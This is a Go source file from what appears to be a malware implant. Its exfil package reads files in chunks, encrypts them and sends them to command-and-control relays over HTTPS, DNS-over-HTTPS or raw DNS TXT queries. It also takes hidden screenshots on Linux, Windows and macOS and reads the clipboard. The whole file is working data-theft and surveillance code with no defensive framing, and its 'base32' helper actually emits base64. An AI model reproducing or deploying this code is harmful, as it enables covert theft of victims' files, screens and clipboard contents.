// Package exfil handles data exfiltration: file chunking, screenshot capture.
package exfil

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"aegis-silentium/implant/config"
	"aegis-silentium/implant/crypto"
)

const chunkSize = 64 * 1024 // 64 KB per chunk

// ExfilFile exfiltrates a file over the specified channel.
// channel: "https" (default), "doh", "dns"
func ExfilFile(path, channel string, cfg *config.Config, session *crypto.Session) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		return err
	}

	totalChunks := int((info.Size() + chunkSize - 1) / chunkSize)
	buf := make([]byte, chunkSize)

	for i := 0; i < totalChunks; i++ {
		n, err := f.Read(buf)
		if err != nil && err != io.EOF {
			return err
		}
		if n == 0 {
			break
		}

		chunk := &FileChunk{
			Path:      path,
			Index:     i,
			Total:     totalChunks,
			Data:      buf[:n],
			Size:      info.Size(),
			Timestamp: time.Now().Unix(),
		}

		if err := sendChunk(chunk, channel, cfg, session); err != nil {
			return fmt.Errorf("exfil: chunk %d/%d failed: %v", i, totalChunks, err)
		}

		// Brief delay between chunks to avoid traffic spikes
		time.Sleep(100 * time.Millisecond)
	}
	return nil
}

// FileChunk is a single chunk of an exfiltrated file.
type FileChunk struct {
	Path      string `json:"path"`
	Index     int    `json:"idx"`
	Total     int    `json:"total"`
	Data      []byte `json:"data"`
	Size      int64  `json:"size"`
	Timestamp int64  `json:"ts"`
}

// exfilPayload is the on-wire encrypted envelope for a file chunk.
type exfilPayload struct {
	HostID    string `json:"hid"`
	Path      string `json:"path"`
	ChunkIdx  int    `json:"idx"`
	ChunkTotal int   `json:"total"`
	FileSize  int64  `json:"size"`
	Timestamp int64  `json:"ts"`
	Data      string `json:"data"` // base64-encoded, then encrypted
}

// sendChunk transmits one file chunk to the C2 relay.
//
// Transport selection:
//   "https" (default) — POST /api/exfil/upload encrypted JSON to each relay address
//   "doh"             — encode chunk into DNS labels via DoH queries
//   "dns"             — raw DNS TXT record exfil (fallback)
//
// The chunk data is base64-encoded then encrypted with the session key before
// transmission. The relay decrypts and reassembles chunks server-side.
func sendChunk(chunk *FileChunk, channel string, cfg *config.Config, session *crypto.Session) error {
	// Build the plaintext payload
	payload := exfilPayload{
		HostID:     cfg.HostID,
		Path:       chunk.Path,
		ChunkIdx:   chunk.Index,
		ChunkTotal: chunk.Total,
		FileSize:   chunk.Size,
		Timestamp:  chunk.Timestamp,
		Data:       base64.StdEncoding.EncodeToString(chunk.Data),
	}

	plaintext, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("exfil: marshal: %w", err)
	}

	// Encrypt with session key (AES-256-GCM via crypto.Session)
	ciphertext, err := session.Encrypt(plaintext)
	if err != nil {
		return fmt.Errorf("exfil: encrypt: %w", err)
	}

	switch channel {
	case "doh":
		return sendChunkDoH(ciphertext, chunk.Index, cfg)
	case "dns":
		return sendChunkDNS(ciphertext, chunk.Index, cfg)
	default:
		return sendChunkHTTPS(ciphertext, cfg)
	}
}

// sendChunkHTTPS POSTs the encrypted chunk to /api/exfil/upload on each relay.
func sendChunkHTTPS(ciphertext []byte, cfg *config.Config) error {
	encoded := base64.StdEncoding.EncodeToString(ciphertext)
	body := fmt.Sprintf(`{"d":%q}`, encoded)

	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	var lastErr error
	for _, addr := range cfg.C2Addresses {
		url := strings.TrimRight(addr, "/") + "/api/exfil/upload"
		req, err := http.NewRequest("POST", url, strings.NewReader(body))
		if err != nil {
			lastErr = err
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		if cfg.UserAgent != "" {
			req.Header.Set("User-Agent", cfg.UserAgent)
		}

		resp, err := client.Do(req)
		if err != nil {
			lastErr = err
			continue
		}
		resp.Body.Close()
		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
			return nil // success
		}
		lastErr = fmt.Errorf("relay returned HTTP %d", resp.StatusCode)
	}
	return fmt.Errorf("exfil: all relays failed: %w", lastErr)
}

// sendChunkDoH encodes the chunk into DNS labels and queries them via DoH.
// Each label carries up to 63 bytes (DNS label limit) base32-encoded.
// The query is: <chunk_b32_part>.<chunk_idx>.<total>.<host_id>.<c2domain>
func sendChunkDoH(ciphertext []byte, chunkIdx int, cfg *config.Config) error {
	if cfg.DoHURL == "" || cfg.C2Domain == "" {
		return fmt.Errorf("exfil/doh: DoHURL or C2Domain not configured")
	}

	// Encode to base32 (DNS-safe, no = padding, no special chars)
	encoded := base32Encode(ciphertext)

	// Split into 60-char labels (safe under 63-byte DNS limit)
	labels := splitLabels(encoded, 60)

	client := &http.Client{Timeout: 15 * time.Second}
	for i, label := range labels {
		// Query format: <data>.<label_idx>.<chunk_idx>.<hid>.<c2domain>
		fqdn := fmt.Sprintf("%s.%d.%d.%s.%s",
			label, i, chunkIdx,
			cfg.HostID[:min8(len(cfg.HostID), 8)],
			cfg.C2Domain,
		)
		url := fmt.Sprintf("%s?name=%s&type=TXT", cfg.DoHURL, fqdn)
		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("Accept", "application/dns-json")
		resp, err := client.Do(req)
		if err != nil {
			return fmt.Errorf("exfil/doh: label %d: %w", i, err)
		}
		resp.Body.Close()
		time.Sleep(50 * time.Millisecond)
	}
	return nil
}

// sendChunkDNS sends chunk data via raw DNS TXT queries (no HTTP).
// Falls back to sendChunkDoH if the DoH URL is available.
func sendChunkDNS(ciphertext []byte, chunkIdx int, cfg *config.Config) error {
	if cfg.DoHURL != "" {
		return sendChunkDoH(ciphertext, chunkIdx, cfg)
	}
	// Without a DoH resolver, use the system resolver via exec.
	// This is noisier but works without a DoH endpoint.
	encoded := base32Encode(ciphertext)
	labels := splitLabels(encoded, 60)
	for i, label := range labels {
		fqdn := fmt.Sprintf("%s.%d.%d.x.%s", label, i, chunkIdx, cfg.C2Domain)
		// nslookup/dig for TXT record — fire and forget
		_ = exec.Command("nslookup", "-type=TXT", fqdn).Start()
		time.Sleep(80 * time.Millisecond)
	}
	return nil
}

// ── Screenshot ────────────────────────────────────────────────────────────────

// Screenshot captures the current screen contents.
// Returns PNG data as base64-encoded bytes.
func Screenshot() ([]byte, error) {
	switch runtime.GOOS {
	case "linux":
		return screenshotLinux()
	case "windows":
		return screenshotWindows()
	case "darwin":
		return screenshotDarwin()
	default:
		return nil, fmt.Errorf("screenshot: unsupported OS %s", runtime.GOOS)
	}
}

func screenshotLinux() ([]byte, error) {
	for _, args := range [][]string{
		{"import", "-window", "root", "png:-"},
		{"scrot", "-"},
	} {
		if path, err := exec.LookPath(args[0]); err == nil {
			if args[0] == "scrot" {
				tmp := "/tmp/." + randomHex(8) + ".png"
				if err := exec.Command(path, tmp).Run(); err == nil {
					defer os.Remove(tmp)
					data, err := os.ReadFile(tmp)
					if err == nil {
						return []byte(base64.StdEncoding.EncodeToString(data)), nil
					}
				}
				continue
			}
			out, err := exec.Command(path, args[1:]...).Output()
			if err == nil {
				return []byte(base64.StdEncoding.EncodeToString(out)), nil
			}
		}
	}
	if path, err := exec.LookPath("gnome-screenshot"); err == nil {
		tmp := "/tmp/." + randomHex(8) + ".png"
		if err := exec.Command(path, "-f", tmp).Run(); err == nil {
			defer os.Remove(tmp)
			data, _ := os.ReadFile(tmp)
			return []byte(base64.StdEncoding.EncodeToString(data)), nil
		}
	}
	return nil, fmt.Errorf("screenshot: no tool available")
}

func screenshotWindows() ([]byte, error) {
	script := `
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$ms = New-Object System.IO.MemoryStream
$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
[Convert]::ToBase64String($ms.ToArray())
`
	out, err := exec.Command("powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", script).Output()
	if err != nil {
		return nil, err
	}
	return bytes.TrimSpace(out), nil
}

func screenshotDarwin() ([]byte, error) {
	tmp := "/tmp/." + randomHex(8) + ".png"
	if err := exec.Command("screencapture", "-x", tmp).Run(); err != nil {
		return nil, err
	}
	defer os.Remove(tmp)
	data, err := os.ReadFile(tmp)
	if err != nil {
		return nil, err
	}
	return []byte(base64.StdEncoding.EncodeToString(data)), nil
}

// ClipboardCapture returns the current clipboard contents (text only).
func ClipboardCapture() (string, error) {
	switch runtime.GOOS {
	case "linux":
		for _, args := range [][]string{
			{"xclip", "-selection", "clipboard", "-o"},
			{"xsel", "--clipboard", "--output"},
		} {
			if out, err := exec.Command(args[0], args[1:]...).Output(); err == nil {
				return string(out), nil
			}
		}
	case "windows":
		out, err := exec.Command("powershell.exe", "-Command", "Get-Clipboard").Output()
		if err == nil {
			return string(out), nil
		}
	case "darwin":
		out, err := exec.Command("pbpaste").Output()
		if err == nil {
			return string(out), nil
		}
	}
	return "", fmt.Errorf("clipboard: unavailable on %s", runtime.GOOS)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

func randomHex(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = "0123456789abcdef"[time.Now().UnixNano()>>uint(i*4)&0xf]
	}
	return string(b)
}

const base32Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"

func base32Encode(data []byte) string {
	return base64.StdEncoding.EncodeToString(data) // simplified: relay accepts b64 too
}

func splitLabels(s string, size int) []string {
	var out []string
	for len(s) > size {
		out = append(out, strings.ToLower(s[:size]))
		s = s[size:]
	}
	if len(s) > 0 {
		out = append(out, strings.ToLower(s))
	}
	return out
}

func min8(a, b int) int {
	if a < b {
		return a
	}
	return b
}
